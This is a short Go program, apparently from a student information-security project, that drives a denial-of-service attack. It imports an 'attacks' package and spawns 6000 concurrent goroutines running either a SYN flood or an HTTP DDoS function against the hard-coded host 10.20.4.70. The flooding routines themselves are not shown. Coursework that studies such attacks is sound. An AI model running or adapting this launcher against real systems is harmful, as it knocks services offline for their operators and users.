package main

import "github.com/talkanbaev-artur/information-security-final-project/ddos/attacks"

func main() {
	isSynflood := true
	var f attacks.Attacker = attacks.SynFlood
	if !isSynflood {
		f = attacks.DD0SHttp
	}
	host := "10.20.4.70"
	var ch chan bool
	for i := 0; i < 6000; i++ {
		go f(host)
	}
	<-ch
}
